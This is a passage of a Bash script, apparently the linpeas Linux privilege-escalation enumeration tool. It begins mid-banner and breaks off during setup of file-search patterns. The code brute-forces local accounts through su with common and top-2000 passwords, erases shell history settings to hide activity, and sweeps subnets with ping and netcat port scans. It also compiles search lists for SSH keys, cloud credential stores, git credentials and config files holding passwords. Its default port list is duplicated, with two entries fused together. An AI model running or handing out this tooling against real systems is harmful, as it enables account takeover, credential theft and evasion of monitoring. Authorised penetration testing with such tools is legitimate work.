\e[48;2;98;177;78m\e[38;2;98;176;78m▄\e[48;2;98;177;78m\e[38;2;99;179;78m▄\e[48;2;98;177;78m\e[38;2;93;169;74m▄\e[48;2;98;177;78m\e[38;2;56;106;44m▄\e[48;2;96;174;77m\e[38;2;16;31;13m▄\e[48;2;68;126;54m\e[38;2;58;58;58m▄\e[48;2;28;50;23m\e[38;2;180;180;180m▄\e[48;2;20;22;20m\e[38;2;240;240;240m▄\e[48;2;86;85;86m\e[38;2;253;253;253m▄\e[48;2;199;199;199m\e[38;2;255;255;255m▄ \e[0m
             \e[48;2;146;147;145m\e[38;2;254;254;254m▄\e[48;2;41;52;39m\e[38;2;242;242;242m▄\e[48;2;39;76;30m\e[38;2;192;192;192m▄\e[48;2;73;136;57m\e[38;2;132;134;132m▄\e[48;2;90;162;72m\e[38;2;96;100;95m▄\e[48;2;99;175;79m\e[38;2;60;69;58m▄\e[48;2;98;177;78m\e[38;2;46;59;43m▄\e[48;2;98;177;78m\e[38;2;32;51;27m▄\e[48;2;98;178;78m\e[38;2;28;50;23m▄\e[48;2;98;178;78m\e[38;2;28;55;22m▄\e[48;2;98;178;78m\e[38;2;35;64;28m▄\e[48;2;98;177;78m\e[38;2;41;75;33m▄\e[48;2;98;177;78m\e[38;2;50;89;41m▄\e[48;2;98;177;77m\e[38;2;54;89;45m▄\e[48;2;98;177;77m\e[38;2;53;89;44m▄\e[48;2;98;177;78m\e[38;2;49;86;39m▄\e[48;2;98;177;78m\e[38;2;45;83;36m▄\e[48;2;98;177;78m\e[38;2;40;74;32m▄\e[48;2;98;177;78m\e[38;2;35;64;28m▄\e[48;2;98;178;78m\e[38;2;39;60;33m▄\e[48;2;90;163;71m\e[38;2;55;61;53m▄\e[48;2;53;97;41m\e[38;2;111;111;111m▄\e[48;2;24;44;19m\e[38;2;186;186;186m▄\e[48;2;36;41;35m\e[38;2;242;242;242m▄\e[48;2;132;131;132m\e[38;2;255;255;255m▄\e[0m
  '";
  
  else
  echo "     [48;5;108m     [48;5;59m [48;5;71m [48;5;77m       [48;5;22m [48;5;108m   [48;5;114m [48;5;59m [49m
     [48;5;108m  [48;5;71m [48;5;22m [48;5;113m [48;5;71m [48;5;94m [48;5;214m  [48;5;58m [48;5;214m    [48;5;100m [48;5;71m  [48;5;16m [48;5;108m  [49m
     [48;5;65m [48;5;16m [48;5;22m [48;5;214m      [48;5;16m [48;5;214m        [48;5;65m  [49m
     [48;5;65m [48;5;214m       [48;5;16m [48;5;214m [48;5;16m [48;5;214m       [48;5;136m [48;5;65m [49m
     [48;5;23m [48;5;214m          [48;5;178m [48;5;214m       [48;5;65m [49m
     [48;5;16m [48;5;214m         [48;5;136m [48;5;94m   [48;5;136m [48;5;214m    [48;5;65m [49m
     [48;5;58m [48;5;214m  [48;5;172m [48;5;64m [48;5;77m             [48;5;71m [48;5;65m [49m
     [48;5;16m [48;5;71m [48;5;77m  [48;5;71m [48;5;77m         [48;5;71m [48;5;77m   [48;5;65m  [49m
     [48;5;59m [48;5;71m [48;5;77m [48;5;77m [48;5;16m [48;5;77m         [48;5;16m [48;5;77m   [48;5;65m  [49m
     [48;5;65m  [48;5;77m      [48;5;71m [48;5;16m [48;5;77m    [48;5;113m [48;5;77m   [48;5;65m  [49m
     [48;5;65m [48;5;16m [48;5;77m  [48;5;150m [48;5;113m [48;5;77m        [48;5;150m [48;5;113m [48;5;77m [48;5;65m [48;5;59m [48;5;65m [49m
     [48;5;16m [48;5;65m [48;5;71m [48;5;77m             [48;5;71m [48;5;22m [48;5;65m  [49m
     [48;5;108m  [48;5;107m [48;5;59m [48;5;77m           [48;5;16m [48;5;114m [48;5;108m   [49m"
    fi
}

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout 1 su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
  fi
}

su_brute_user_num (){
  USER=$1
  TRIES=$2
  su_try_pwd $USER "" &    #Try without password
  su_try_pwd $USER $USER & #Try username as password
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` & #Try reverse username as password
  for i in `seq $TRIES`; do 
    su_try_pwd $USER `echo $top2000pwds | cut -d " " -f $i` & #Try TOP TRIES of passwords (by default 2000)
    sleep 0.007 # To not overload the system
  done
  wait
}

check_if_su_brute(){
  error=$(echo "" | timeout 1 su `whoami` -c whoami 2>&1);
  if [ ! "`echo $error | grep "must be run from a terminal"`" ]; then
    echo "1"
  fi 
}

###########################################
#----------) Network functions (----------#
###########################################
# Adapted from https://github.com/carlospolop/bashReconScan/blob/master/brs.sh

basic_net_info(){
  echo ""
  (ifconfig || ip a) 2>/dev/null
  echo ""
}

select_nc (){
  #Select the correct configuration of the netcat found
  NC_SCAN="$FOUND_NC -v -n -z -w 1"
  $($FOUND_NC 127.0.0.1 65321 > /dev/null 2>&1)
  if [ $? -eq 2 ]
  then
    NC_SCAN="timeout 1 $FOUND_NC -v -n" 
  fi
}

icmp_recon (){
  #Discover hosts inside a /24 subnetwork using ping (start pingging broadcast addresses)
	IP3=$(echo $1 | cut -d "." -f 1,2,3)
	
  (timeout 1 ping -b -c 1 "$IP3.255" 2>/dev/null | grep "icmp_seq" | sed "s,[0-9]\+.[0-9]\+.[0-9]\+.[0-9]\+,${C}[1;31m&${C}[0m,") &
  (timeout 1 ping -b -c 1 "255.255.255.255" 2>/dev/null | grep "icmp_seq" | sed "s,[0-9]\+.[0-9]\+.[0-9]\+.[0-9]\+,${C}[1;31m&${C}[0m,") &
	for j in $(seq 0 254)
	do
    (timeout 1 ping -b -c 1 "$IP3.$j" 2>/dev/null | grep "icmp_seq" | sed "s,[0-9]\+.[0-9]\+.[0-9]\+.[0-9]\+,${C}[1;31m&${C}[0m,") &
	done
  wait
}

tcp_recon (){
  #Discover hosts inside a /24 subnetwork using tcp connection to most used ports and selected ones
  IP3=$(echo $1 | cut -d "." -f 1,2,3)
	PORTS=$2
  printf $Y"[+]$B Ports going to be scanned: $PORTS" $NC | tr '\n' " "
  printf "$NC\n"

  for port in $PORTS; do
    for j in $(seq 1 254)
    do 
      ($NC_SCAN $IP3.$j $port 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed "s,[0-9\.],${C}[1;31m&${C}[0m,g") &
    done
    wait
  done
}

tcp_port_scan (){
  #Scan open ports of a host. Default: nmap top 1000, but the user can select others
  basic_net_info

  printf $B"===================================( "$GREEN"Network Port Scanning"$B" )===================================\n"$NC
  IP=$1
	PORTS=$2

  if [ -z "$PORTS" ]; then
    printf $Y"[+]$B Ports going to be scanned: DEFAULT (nmap top 1000)" $NC | tr '\n' " "
    printf "$NC\n"
    PORTS="1 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 653891 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389"
  else
    printf $Y"[+]$B Ports going to be scanned: $PORTS" $NC | tr '\n' " "
    printf "$NC\n"
  fi

  for port in $PORTS; do
    ($NC_SCAN $IP $port 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed "s,[0-9\.],${C}[1;31m&${C}[0m,g") &
  done
  wait
}

discover_network (){
  #Check if IP and Netmask are correct and the use fping or ping to find hosts
  basic_net_info

  printf $B"====================================( "$GREEN"Network Discovery"$B" )=====================================\n"$NC

  DISCOVERY=$1
  IP=$(echo $DISCOVERY | cut -d "/" -f 1)
  NETMASK=$(echo $DISCOVERY | cut -d "/" -f 2)
  
  if [ -z $IP ] || [ -z $NETMASK ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
    printf $B"$HELP"$NC;
    exit 0
  fi

  #Using fping if possible
  if [ "$FPING" ]; then 
    $FPING -a -q -g $DISCOVERY | sed "s,.*,${C}[1;31m&${C}[0m,"
  
  #Loop using ping
  else
    if [ $NETMASK -eq "24" ]; then
      printf $Y"[+]$GREEN Netmask /24 detected, starting...\n$NC"
      icmp_recon $IP
      
    elif [ $NETMASK -eq "16" ]; then
      printf $Y"[+]$GREEN Netmask /16 detected, starting...\n$NC"
      for i in $(seq 1 254)
      do	
        NEWIP=$(echo $IP | cut -d "." -f 1,2).$i.1
        icmp_recon $NEWIP
      done
    else
      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
      exit 0
    fi
  fi
}

discovery_port_scan (){
  basic_net_info

  #Check if IP and Netmask are correct and the use nc to find hosts. By default check ports: 22 80 443 445 3389
  printf $B"============================( "$GREEN"Network Discovery (scanning ports)"$B" )=============================\n"$NC
  DISCOVERY=$1
  MYPORTS=$2

  IP=$(echo $DISCOVERY | cut -d "/" -f 1)
  NETMASK=$(echo $DISCOVERY | cut -d "/" -f 2)
  
  if [ -z $IP ] || [ -z $NETMASK ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
    printf $B"$HELP"$NC;
    exit 0
  fi

  PORTS="22 80 443 445 3389 `echo $MYPORTS | tr "," " "`"
  PORTS=`echo "$PORTS" | tr " " "\n" | sort -u` #Delete repetitions

  if [ $NETMASK -eq "24" ]; then
    printf $Y"[+]$GREEN Netmask /24 detected, starting...\n" $NC
		tcp_recon $IP "$PORTS"
	
	elif [ $NETMASK -eq "16" ]; then
    printf $Y"[+]$GREEN Netmask /16 detected, starting...\n" $NC
		for i in $(seq 0 255)
		do	
			NEWIP=$(echo $IP | cut -d "." -f 1,2).$i.1
			tcp_recon $NEWIP "$PORTS"
		done
  else
      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in port discovery mode. Netmask detected: $NETMASK"$NC;
      exit 0
	fi
}


###########################################
#---) Exporting history env variables (---#
###########################################

if ! [ "$NOTEXPORT" ]; then
  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
  export HISTFILE=/dev/null
  export HISTSIZE=0
  export HISTFILESIZE=0
fi


###########################################
#-----------) Starting Output (-----------#
###########################################
# First, search a writable file (if needed)
if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
  file=""
  for f in $WF; do
    echo '' 2>/dev/null > $f/$filename
    if [ $? -eq 0 ]; then file="$f/$filename"; break; fi;
  done;
fi

echo ""
if [ !"$QUIET" ]; then print_banner; fi
printf "  linpeas $VERSION" | sed "s,.*,${C}[1;94m&${C}[0m,"; printf $Y" by carlospolop\n"$NC
echo ""
printf $Y"ADVISORY: "$B"$ADVISORY\n"$NC
echo ""
printf $B"Linux Privesc Checklist: "$Y"https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist\n"$NC
echo " LEGEND:" | sed "s,LEGEND,${C}[1;4m&${C}[0m,"
echo "  RED/YELLOW: 99% a PE vector" | sed "s,RED/YELLOW,${C}[1;31;103m&${C}[0m,"
echo "  RED: You must take a look at it" | sed "s,RED,${C}[1;31m&${C}[0m,"
echo "  LightCyan: Users with console" | sed "s,LightCyan,${C}[1;96m&${C}[0m,"
echo "  Blue: Users without console & mounted devs" | sed "s,Blue,${C}[1;34m&${C}[0m,"
echo "  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) " | sed "s,Green,${C}[1;32m&${C}[0m,"
echo "  LightMangeta: Your username" | sed "s,LightMagenta,${C}[1;95m&${C}[0m,"
if [ "$IAMROOT" ]; then
  echo ""
  echo "  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)" | sed "s,YOU ARE ALREADY ROOT!!!,${C}[1;31;103m&${C}[0m,"
  sleep 3
fi
echo ""
echo ""


###########################################
#-----------) Some Basic Info (-----------#
###########################################

printf $B"====================================( "$GREEN"Basic information"$B" )=====================================\n"$NC
printf $LG"OS: "$NC
(cat /proc/version || uname -a ) 2>/dev/null | sed "s,$kernelDCW_Ubuntu_Precise_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Precise_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Trusty_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Trusty_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Ubuntu_Xenial,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel5,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel6_1,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel6_2,${C}[1;31;103m&${C}[0m," | sed "s,$kernelDCW_Rhel7,${C}[1;31;103m&${C}[0m," | sed "s,$kernelB,${C}[1;31m&${C}[0m,"
printf $LG"User & Groups: "$NC
(id || (whoami && groups)) 2>/dev/null | sed "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed "s,$groupsVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,$idB,${C}[1;31m&${C}[0m,g"
printf $LG"Hostname: "$NC
hostname 2>/dev/null
if [ "$file" ]; then printf $LG"Writable folder: "$NC; fi
echo $Wfolder
if [ "$DISCOVER_BAN_GOOD" ]; then
  printf $Y"[+] $DISCOVER_BAN_GOOD\n"$NC
else
  printf $RED"[-] $DISCOVER_BAN_BAD\n"$NC
fi

if [ "$SCAN_BAN_GOOD" ]; then
  printf $Y"[+] $SCAN_BAN_GOOD\n"$NC
else
  printf $RED"[-] $SCAN_BAN_BAD\n"$NC
fi
if [ "`which nmap 2>/dev/null`" ];then
  NMAP_GOOD=$GREEN"nmap$B is available for network discover & port scanning, you should use it yourself"
  printf $Y"[+] $NMAP_GOOD\n"$NC
fi
echo ""
echo ""


###########################################
#--------) Check if network jobs (--------#
###########################################
if [ "$PORTS" ]; then
  if [ "$SCAN_BAN_GOOD" ]; then
    if [ "`echo -n $PORTS | sed 's,[0-9, ],,g'`" ]; then
      printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
      printf $B"$HELP"$NC;
      exit 0
    else
      #Select the correct configuration of the netcat found
      select_nc
    fi
  else
    printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
    printf $B"$HELP"$NC;
    exit 0
  fi
fi  

if [ "$DISCOVERY" ]; then
  if [ "$PORTS" ]; then
    discovery_port_scan $DISCOVERY $PORTS
  else
    if [ "$DISCOVER_BAN_GOOD" ]; then
      discover_network $DISCOVERY
    else
      printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
    fi
  fi
  exit 0

elif [ "$IP" ]; then
  select_nc 
  tcp_port_scan $IP $PORTS
  exit 0
fi


if [ "`echo $CHECKS | grep ProCronSrvcsTmrsSocks`" ] || [ "`echo $CHECKS | grep IntFiles`" ] || [ "`echo $CHECKS | grep SofI`" ]; then
  ###########################################
  #----------) Caching Finds (--------------#
  ###########################################
  
  prep_to_find() {
      echo "$1" | sed 's/ /" -o -name "/g' | sed 's/^/\\( -name "/g' | sed 's/$/" \\)/g'
  }

  printf $GREEN"Caching directories "$NC
  SYSTEMD_RELEVANT_NAMES="*.service"
  TIMERS_RELEVANT_NAMES="*.timer"
  SOCKETS_RELEVANT_NAMES="*.socket"
  DBUS_RELEVANT_NAMES="system.d session.d"

  MYSQL_RELEVANT_NAMES="mysql"
  POSTGRESQL_RELEVANT_NAMES="pgadmin*.db pg_hba.conf postgresql.conf pgsql.conf"
  APACHE_RELEVANT_NAMES="sites-enabled 000-default"
  PHP_RELEVANT_NAMES="sess_* *config*.php"
  WORDPRESS_RELEVANT_NAMES="wp-config.php"
  DRUPAL_RELEVANT_NAMES="settings.php"
  TOMCAT_RELEVANT_NAMES="tomcat-users.xml"
  MONGO_RELEVANT_NAMES="mongod*.conf"
  SUPERVISORD_RELEVANT_NAMES="supervisord.conf"
  CESI_RELEVANT_NAMES="cesi.conf"
  RSYNCD_RELEVANT_NAMES="rsyncd.conf rsyncd.secrets"
  HOSTAPAD_RELEVANT_NAMES="hostapd.conf"
  ANACONDA_KS_RELEVANT_NAMES="anaconda-ks.cfg"
  VNC_RELEVANT_NAMES=".vnc"
  LDAP_RELEVANT_NAMES="ldap"
  OVPN_RELEVANT_NAMES="*.ovpn"
  SSH_RELEVANT_NAMES="id_dsa* id_rsa* known_hosts authorized_hosts authorized_keys *.pem *.cer *.crt *.csr *.der *.pfx *.p12 agent* config vault-ssh-helper.hcl .vault-token"
  CLOUD_KEYS_RELEVANT_NAMES="credentials credentials.db legacy_credentials.db access_tokens.db accessTokens.json azureProfile.json cloud.cfg"
  KERBEROS_RELEVANT_NAMES="krb5.conf"
  KIBANA_RELEVANT_NAMES="kibana.y*ml"
  KNOCK_RELEVANT_NAMES="knockd"
  LOGSTASH_RELEVANT_NAMES="logstash"
  ELASTICSEARCH_RELEVANT_NAMES="elasticsearch.y*ml"
  COUCHDB_RELEVANT_NAMES="couchdb"
  REDIS_RELEVANT_NAMES="redis.conf"
  MOSQUITTO_RELEVANT_NAMES="mosquitto.conf"
  NEO4J_RELEVANT_NAMES="neo4j"
  ERLANG_RELEVANT_NAMES=".erlang.cookie"
  GVM_RELEVANT_NAMES="gvm-tools.conf"
  IPSEC_RELEVANT_NAMES="ipsec.secrets ipsec.conf"

  DB_RELEVANT_NAMES="*.db *.sqlite *.sqlite3"
  INSTERESTING_RELEVANT_NAMES="*_history .sudo_as_admin_successful .profile *bashrc *httpd.conf *.plan .htpasswd .gitconfig .git-credentials .git .svn *.rhost hosts.equiv Dockerfile docker-compose.yml"
  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"


  FIND_SYSTEMD_RELEVANT_NAMES=$(prep_to_find "$SYSTEMD_RELEVANT_NAMES")
  FIND_TIMERS_RELEVANT_NAMES=$(prep_to_find "$TIMERS_RELEVANT_NAMES")
  FIND_SOCKETS_RELEVANT_NAMES=$(prep_to_find "$SOCKETS_RELEVANT_NAMES")
  FIND_DBUS_RELEVANT_NAMES=$(prep_to_find "$DBUS_RELEVANT_NAMES")

  FIND_MYSQL_RELEVANT_NAMES=$(prep_to_find "$MYSQL_RELEVANT_NAMES")
  FIND_POSTGRESQL_RELEVANT_NAMES=$(prep_to_find "$POSTGRESQL_RELEVANT_NAMES")
  FIND_APACHE_RELEVANT_NAMES=$(prep_to_find "$APACHE_RELEVANT_NAMES")
